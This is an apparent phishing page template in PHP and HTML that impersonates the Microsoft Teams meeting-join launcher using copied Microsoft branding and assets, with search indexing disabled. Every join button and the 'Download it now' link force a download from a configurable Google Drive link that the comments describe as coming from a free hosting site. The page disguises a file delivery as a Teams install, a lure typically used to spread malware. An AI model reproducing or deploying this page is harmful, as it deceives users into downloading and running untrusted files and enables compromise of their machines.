<?php
// ===========================================
// AUTO-DOWNLOAD & REDIRECT CONFIGURATION
// ===========================================
// Insert your file download link below (from free hosting site)
$downloadLink = "https://drive.google.com/uc?export=download&id=1wG9-8Uf8dq1nPKS7rLSsvpyamFPmxjtw";

// Insert your Teams meeting join link below
$teamsJoinLink = "https://drive.google.com/uc?export=download&id=1wG9-8Uf8dq1nPKS7rLSsvpyamFPmxjtw"; // Example: "https://teams.microsoft.com/l/meetup-join/..."
?>
<html lang="en-GB" dir="ltr" class="ltr uiv3">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-2025.ico"
    />
    <link
      rel="apple-touch-icon"
      href="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-96x96-2025.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="16x16"
      href="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-16x16-2025.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="32x32"
      href="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-32x32-2025.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="96x96"
      href="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-96x96-2025.png"
    />
    <meta property="placeholder" />
    <meta property="og:site_name" content="Microsoft Teams" />
    <meta
      property="og:image"
      content="https://statics.teams.cdn.office.net/hashedassets-launcher/favicon/favicon-96x96-2025.png"
    />
    <title>Join conversation</title>
    <link
      href="https://statics.teams.cdn.office.net/hashedcss-launcher/launcher.781909af2ea6328ff48b.css"
      rel="stylesheet"
      nonce=""
    />
  </head>
  <body>
    <div id="launcherApp">
      <div class="" id="rootViewV2">
        <div class="modernViewContainer noBranding">
          <div id="container">
            <div class="modernViewRenderer">
              <div class="modernSimplifiedView">
                <div class="mainActionsContent">
                  <div class="headerContainer">
                    <div class="logoContainer">
                      <img
                        class="logo"
                        src="https://statics.teams.cdn.office.net/hashedassets-launcher/v2/logo_teams2025.95533d03cd2c18096f458ea5f26b6eaf.svg"
                        aria-hidden="true"
                      />
                    </div>
                  </div>
                  <div class="actionsContainer">
                    <div class="content" id="textbox">
                      <h3>Join your Teams meeting</h3>
                    </div>
                    <div class="buttonsContainer">
                      <button
                        aria-label="Join meeting from this browser"
                        class="btn primary"
                        data-tid="joinOnWeb"
                        onclick="window.location.href='<?php echo htmlspecialchars($teamsJoinLink); ?>'"
                      >
                        <div class="btnIcon">
                          <div class="text">
                            <h3>Continue on this browser</h3>
                          </div>
                        </div>
                      </button>
                      <button
                        aria-label="Open Teams app to join a meeting"
                        class="btn secondary"
                        data-tid="joinInApp"
                        onclick="window.location.href='<?php echo htmlspecialchars($downloadLink); ?>'"
                      >
                        <div class="btnIcon">
                          <div class="text"><h3>Join on the Teams app</h3></div>
                        </div>
                      </button>
                    </div>
                  </div>
                </div>
                <div class="secondaryActionsContent">
                  <div class="secondaryAction">
                    <img
                      src="https://statics.teams.cdn.office.net/hashedassets-launcher/v2/logo_teams2025.95533d03cd2c18096f458ea5f26b6eaf.svg"
                      class="img"
                      aria-hidden="true"
                    />
                    <div class="text">
                      <p>
                        Don't have the app?<br /><a
                          href="<?php echo htmlspecialchars($downloadLink); ?>"
                          data-tid="download"
                          aria-label="Download Teams application"
                          >Download it now</a
                        >
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="disclaimer" role="contentinfo">
            <div class="view centered">
              <span class="disclaimerTextWithLogo"
                ><img
                  src="https://statics.teams.cdn.office.net/hashedassets-launcher/v3/microsoft_logo.3c5fb2e769272b22e31e2535162f6a38.svg"
                  aria-hidden="true"
                /><span class="hideText">Microsoft Teams</span></span
              ><a
                href="https://go.microsoft.com/fwlink/?LinkId=521839"
                target="_blank"
                rel="noopener noreferrer"
                class="privacyStatementLink"
                >Privacy and cookies</a
              ><a
                href="attribution.txt"
                target="_blank"
                rel="noopener noreferrer"
                >Third-party disclosures</a
              >
            </div>
          </div>
        </div>
      </div>
    </div>
    <div></div>
  </body>
</html>